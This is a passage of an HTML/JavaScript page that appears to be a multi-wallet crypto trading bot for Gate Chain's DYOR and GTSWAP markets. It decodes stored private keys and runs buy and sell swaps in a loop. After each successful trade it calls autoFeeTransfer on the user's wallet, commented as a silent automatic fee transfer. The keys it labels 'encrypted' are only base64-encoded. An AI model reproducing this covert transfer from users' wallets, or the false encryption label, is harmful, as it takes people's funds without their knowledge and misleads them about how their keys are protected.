                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易已发送: ' + txResponse.hash, 'success');
                        
                        // 等待交易确认
                        const receipt = await txResponse.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] DYOR内盘买入成功!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] 区块: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // 自动收费转账（静默执行）
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            // 显示成功提示
                            showToast('🎉 DYOR内盘买入成功！', 'success');
                            
                            // 更新余额和代币信息
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败 - 状态: ' + receipt.status, 'error');
                            showToast('❌ 买入失败！', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败: ' + error.message, 'error');
                        
                        // 检查协议匹配
                        checkProtocolMatch(error);
                        
                        // 提供更详细的错误信息
                        if (error.code === 'CALL_EXCEPTION') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 合约调用异常，请检查代币地址和参数', 'error');
                        } else if (error.code === 'INSUFFICIENT_FUNDS') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 余额不足', 'error');
                        } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] Gas限制不可预测，交易可能失败', 'error');
                        }
                    }
                }
                
                updateStats();
                showToast('DYOR内盘买入完成', 'success');
                
            } catch (error) {
                console.error('DYOR internal buy failed:', error);
                showToast('DYOR内盘买入失败: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('buyBtn').disabled = false;
                document.getElementById('buyBtnText').textContent = '买入';
            }
        }

        // 执行DYOR内盘卖出
        async function executeDYORInternalSell(activeWallets, tokenAddress, amount) {
            isTrading = true;
            document.getElementById('sellBtn').disabled = true;
            document.getElementById('sellBtnText').innerHTML = '<span class="loading-spinner"></span> DYOR内盘卖出中';
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                const routerAddress = DEX_ADDRESSES.DYOR_INTERNAL.router;
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        addLog('[' + wallet.address.substring(0, 6) + '...] 🔥 开始DYOR内盘卖出交易...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 卖出数量: ' + amount + ' 代币', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] Router地址: ' + routerAddress, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 代币地址: ' + tokenAddress, 'info');
                        
                        // 创建代币合约实例
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, walletInstance);
                        
                        // 获取代币精度
                        const decimals = await tokenContract.decimals();
                        // 默认少卖0.2%避免余额不足错误
                        const adjustedAmount = parseFloat(amount) * 0.998; // 少卖0.2%
                        const sellAmount = ethers.parseUnits(adjustedAmount.toString(), decimals);
                        
                        // 检查余额
                        const balance = await tokenContract.balanceOf(wallet.address);
                        if (balance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 余额不足，无法卖出', 'error');
                            continue;
                        }
                        
                        // 检查授权
                        const allowance = await tokenContract.allowance(wallet.address, routerAddress);
                        if (allowance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 授权额度不足，正在approve...', 'info');
                            
                            const approveTx = await tokenContract.approve(routerAddress, ethers.MaxUint256, {
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2 // EIP-1559
                            });
                            
                            addLog('[' + wallet.address.substring(0, 6) + '...] approve tx: ' + approveTx.hash, 'info');
                            await approveTx.wait();
                            addLog('[' + wallet.address.substring(0, 6) + '...] 授权完成 ✅', 'success');
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 授权额度足够 ✅', 'info');
                        }
                        
                        // DYOR内盘可能不支持getAmountsOut，直接使用固定滑点
                        // 参考您的XLayer代码，使用固定滑点而不是查询价格
                        addLog('[' + wallet.address.substring(0, 6) + '...] DYOR内盘跳过价格查询，使用固定滑点', 'info');
                        
                        // 使用更保守的固定滑点：假设1个代币能换0.0000001 GT（降低10倍）
                        const estimatedPricePerToken = ethers.parseEther("0.0000001"); // 1代币 = 0.0000001 GT（更保守）
                        const estimatedOutput = sellAmount * estimatedPricePerToken / ethers.parseEther("1");
                        const amountOutMin = estimatedOutput * 50n / 100n; // 50%滑点（内盘设置）
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 估算输出: ' + ethers.formatEther(estimatedOutput) + ' GT', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 最小输出: ' + ethers.formatEther(amountOutMin) + ' GT', 'info');
                        
                        // 构建DYOR内盘卖出数据
                        addLog('[' + wallet.address.substring(0, 6) + '...] 开始构建卖出calldata...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 参数: tokenAddress=' + tokenAddress + ', sellAmount=' + sellAmount.toString() + ', amountOutMin=' + amountOutMin.toString() + ', toAddress=' + wallet.address, 'info');
                        
                        const calldata = buildDYORInternalSellCalldata(tokenAddress, sellAmount, amountOutMin, wallet.address);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 卖出数量(wei): ' + sellAmount.toString(), 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 最小输出(wei): ' + amountOutMin.toString(), 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易数据长度: ' + calldata.length, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易数据: ' + calldata, 'info');
                        
                        // 验证calldata是否为空
                        if (!calldata || calldata.length === 0) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ❌ 错误：calldata为空！', 'error');
                            throw new Error('calldata为空，无法发送交易');
                        }
                        
                        // 构建交易对象
                        const tx = {
                            to: routerAddress,
                            value: 0, // 卖出不需要发送ETH
                            data: calldata,
                            gasLimit: gasLimit,
                            maxPriorityFeePerGas: gasSettings.priorityFee,
                            maxFeePerGas: gasSettings.maxFee,
                            type: 2 // EIP-1559
                        };
                        
                        // 执行卖出交易
                        console.log('DYOR内盘卖出交易对象:', {
                            to: tx.to,
                            value: tx.value.toString(),
                            data: tx.data,
                            gasLimit: tx.gasLimit.toString(),
                            maxPriorityFeePerGas: tx.maxPriorityFeePerGas.toString(),
                            maxFeePerGas: tx.maxFeePerGas.toString(),
                            type: tx.type
                        });
                        const sellTx = await walletInstance.sendTransaction(tx);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易已发送: ' + sellTx.hash, 'success');
                        
                        // 等待交易确认
                        const receipt = await sellTx.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] DYOR内盘卖出成功!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] 区块: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // 自动收费转账（静默执行）
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            // 显示成功提示
                            showToast('🎉 DYOR内盘卖出成功！', 'success');
                            
                            // 更新余额和代币信息
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败 - 状态: ' + receipt.status, 'error');
                            showToast('❌ 卖出失败！', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败: ' + error.message, 'error');
                        
                        // 检查协议匹配
                        checkProtocolMatch(error);
                        
                        // 提供更详细的错误信息
                        if (error.code === 'CALL_EXCEPTION') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 合约调用异常，请检查代币地址和参数', 'error');
                        } else if (error.code === 'INSUFFICIENT_FUNDS') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 余额不足', 'error');
                        } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] Gas限制不可预测，交易可能失败', 'error');
                        }
                    }
                }
                
                updateStats();
                showToast('DYOR内盘卖出完成', 'success');
                
            } catch (error) {
                console.error('DYOR internal sell failed:', error);
                showToast('DYOR内盘卖出失败: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('sellBtn').disabled = false;
                document.getElementById('sellBtnText').textContent = '卖出';
            }
        }

        // 执行外盘买入 - GTSWAP/DYOR V2
        async function executeExternalBuy(activeWallets, tokenAddress, amount) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                if (!selectedDex || !DEX_ADDRESSES[selectedDex]) {
                    showToast('请先选择DEX', 'error');
                    return;
                }
                
                const dexConfig = DEX_ADDRESSES[selectedDex];
                const routerAddress = dexConfig.router;
                
                if (routerAddress === '0x...') {
                    showToast(`${selectedDex} Router地址未配置`, 'error');
                    return;
                }
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        addLog('[' + wallet.address.substring(0, 6) + '...] 🚀 开始外盘买入交易...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] DEX: ' + selectedDex, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易金额: ' + amount + ' GT', 'info');
                        
                        // 创建Router合约实例
                        const routerContract = new ethers.Contract(routerAddress, UNISWAP_V2_ROUTER_ABI, walletInstance);
                        
                        // 获取WGT地址
                        const wgtAddress = await routerContract.WETH();
                        
                        // 设置交易路径
                        const path = [wgtAddress, tokenAddress];
                        const deadline = Math.floor(Date.now() / 1000) + 1800; // 30分钟后过期
                        
                        // 计算最小输出（允许5%滑点）
                        const amountIn = ethers.parseEther(amount);
                        const amounts = await routerContract.getAmountsOut(amountIn, path);
                        const amountOutMin = amounts[1] * 95n / 100n; // 5%滑点
                        
                        // 执行买入交易
                        const tx = await routerContract.swapExactETHForTokens(
                            amountOutMin,
                            path,
                            wallet.address,
                            deadline,
                            {
                                value: amountIn,
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2
                            }
                        );
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易已发送: ' + tx.hash, 'success');
                        
                        const receipt = await tx.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ' + selectedDex + '买入成功!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] 区块: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // 自动收费转账（静默执行）
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            showToast('🎉 买入成功！', 'success');
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败 - 状态: ' + receipt.status, 'error');
                            showToast('❌ 买入失败！', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败: ' + error.message, 'error');
                    }
                }
                
                updateStats();
                showToast(selectedDex + '买入完成', 'success');
                
            } catch (error) {
                console.error('External buy failed:', error);
                showToast('外盘买入失败: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('buyBtn').disabled = false;
                document.getElementById('buyBtnText').textContent = '买入';
            }
        }

        // 执行外盘卖出 - GTSWAP/DYOR V2
        async function executeExternalSell(activeWallets, tokenAddress, amount) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                if (!selectedDex || !DEX_ADDRESSES[selectedDex]) {
                    showToast('请先选择DEX', 'error');
                    return;
                }
                
                const dexConfig = DEX_ADDRESSES[selectedDex];
                const routerAddress = dexConfig.router;
                
                if (routerAddress === '0x...') {
                    showToast(`${selectedDex} Router地址未配置`, 'error');
                    return;
                }
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        addLog('[' + wallet.address.substring(0, 6) + '...] 🔥 开始外盘卖出交易...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] DEX: ' + selectedDex, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 卖出数量: ' + amount + ' 代币', 'info');
                        
                        // 创建合约实例
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, walletInstance);
                        const routerContract = new ethers.Contract(routerAddress, UNISWAP_V2_ROUTER_ABI, walletInstance);
                        
                        // 获取代币精度
                        const decimals = await tokenContract.decimals();
                        // 默认少卖0.2%避免余额不足错误
                        const adjustedAmount = parseFloat(amount) * 0.998; // 少卖0.2%
                        const sellAmount = ethers.parseUnits(adjustedAmount.toString(), decimals);
                        
                        // 检查余额
                        const balance = await tokenContract.balanceOf(wallet.address);
                        if (balance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 余额不足，无法卖出', 'error');
                            continue;
                        }
                        
                        // 检查授权
                        const allowance = await tokenContract.allowance(wallet.address, routerAddress);
                        if (allowance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 授权额度不足，正在approve...', 'info');
                            
                            const approveTx = await tokenContract.approve(routerAddress, ethers.MaxUint256, {
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2
                            });
                            
                            addLog('[' + wallet.address.substring(0, 6) + '...] approve tx: ' + approveTx.hash, 'info');
                            await approveTx.wait();
                            addLog('[' + wallet.address.substring(0, 6) + '...] 授权完成 ✅', 'success');
                        }
                        
                        // 获取WGT地址
                        const wgtAddress = await routerContract.WETH();
                        
                        // 设置交易路径
                        const path = [tokenAddress, wgtAddress];
                        const deadline = Math.floor(Date.now() / 1000) + 1800; // 30分钟后过期
                        
                        // 计算最小输出（允许5%滑点）
                        const amounts = await routerContract.getAmountsOut(sellAmount, path);
                        const amountOutMin = amounts[1] * 95n / 100n; // 5%滑点
                        
                        // 执行卖出交易
                        const tx = await routerContract.swapExactTokensForETH(
                            sellAmount,
                            amountOutMin,
                            path,
                            wallet.address,
                            deadline,
                            {
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2
                            }
                        );
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易已发送: ' + tx.hash, 'success');
                        
                        const receipt = await tx.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ' + selectedDex + '卖出成功!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] 区块: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // 自动收费转账（静默执行）
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            showToast('🎉 卖出成功！', 'success');
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败 - 状态: ' + receipt.status, 'error');
                            showToast('❌ 卖出失败！', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败: ' + error.message, 'error');
                    }
                }
                
                updateStats();
                showToast(selectedDex + '卖出完成', 'success');
                
            } catch (error) {
                console.error('External sell failed:', error);
                showToast('外盘卖出失败: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('sellBtn').disabled = false;
                document.getElementById('sellBtnText').textContent = '卖出';
            }
        }

        // 执行内盘卖出 - 集成sell.js脚本
        async function executeInternalSell(activeWallets, tokenAddress, amount) {
            isTrading = true;
            document.getElementById('sellBtn').disabled = true;
            document.getElementById('sellBtnText').innerHTML = '<span class="loading-spinner"></span> 内盘卖出中';
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                // 获取动态gas设置
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        // 基于sell.js脚本的卖出逻辑
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, walletInstance);
                        const sellContract = new ethers.Contract(tokenAddress, SELL_ABI, walletInstance);
                        
                        // 获取代币精度
                        const decimals = await tokenContract.decimals();
                        // 默认少卖0.2%避免余额不足错误
                        const adjustedAmount = parseFloat(amount) * 0.998; // 少卖0.2%
                        const sellAmount = ethers.parseUnits(adjustedAmount.toString(), decimals);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 🔥 开始卖出交易...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 输入数量: ' + amount + ' 代币', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 实际卖出: ' + adjustedAmount.toFixed(6) + ' 代币 (少卖0.2%)', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] Gas模式: ' + GAS_CONFIG.SPEEDS[currentGasSpeed].name, 'info');
                        
                        // 1. 检查余额
                        const balance = await tokenContract.balanceOf(wallet.address);
                        if (balance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 余额不足，无法卖出', 'error');
                            continue;
                        }
                        
                        // 2. 检查/执行 approve
                        const allowance = await tokenContract.allowance(wallet.address, tokenAddress);
                        if (allowance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 授权额度不足，正在approve...', 'info');
                            
                            const approveTx = await tokenContract.approve(tokenAddress, ethers.MaxUint256, {
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2 // EIP-1559
                            });
                            
                            addLog('[' + wallet.address.substring(0, 6) + '...] approve tx: ' + approveTx.hash, 'info');
                            await approveTx.wait();
                            addLog('[' + wallet.address.substring(0, 6) + '...] 授权完成 ✅', 'success');
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 授权额度足够 ✅', 'info');
                        }
                        
                        // 3. 执行卖出交易
                        const sellTx = await sellContract.sellTokens(sellAmount, {
                            gasLimit: gasLimit,
                            maxPriorityFeePerGas: gasSettings.priorityFee,
                            maxFeePerGas: gasSettings.maxFee,
                            type: 2 // EIP-1559
                        });
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易已发送: ' + sellTx.hash, 'success');
                        
                        // 等待交易确认
                        const receipt = await sellTx.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] GTLAUNCH内盘卖出成功!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] 区块: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // 自动收费转账（静默执行）
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            // 显示成功提示
                            showToast('🎉 卖出成功！', 'success');
                            
                            // 更新余额和代币信息
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败 - 状态: ' + receipt.status, 'error');
                            showToast('❌ 卖出失败！', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败: ' + error.message, 'error');
                        
                        // 检查协议匹配
                        checkProtocolMatch(error);
                        
                        // 提供更详细的错误信息
                        if (error.code === 'CALL_EXCEPTION') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 合约调用异常，请检查代币地址和参数', 'error');
                        } else if (error.code === 'INSUFFICIENT_FUNDS') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 余额不足', 'error');
                        } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] Gas限制不可预测，交易可能失败', 'error');
                        }
                    }
                }
                
                updateStats();
                showToast('GTLAUNCH内盘卖出完成', 'success');
                
            } catch (error) {
                console.error('Internal sell failed:', error);
                showToast('内盘卖出失败: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('sellBtn').disabled = false;
                document.getElementById('sellBtnText').textContent = '卖出';
            }
        }

        // 添加日志
        function addLog(message, type) {
            const container = document.getElementById('logContainer');
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry ' + type;
            
            const time = new Date().toLocaleTimeString();
            logEntry.innerHTML = 
                '<span class="log-time">' + time + '</span>' +
                '<span class="log-message">' + message + '</span>';
            
            container.insertBefore(logEntry, container.firstChild);
            
            // 限制日志数量
            while (container.children.length > 100) {
                container.removeChild(container.lastChild);
            }
        }

        // 更新统计
        function updateStats() {
            document.getElementById('totalTrades').textContent = stats.totalTrades;
        }

        // 页面加载完成后初始化
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
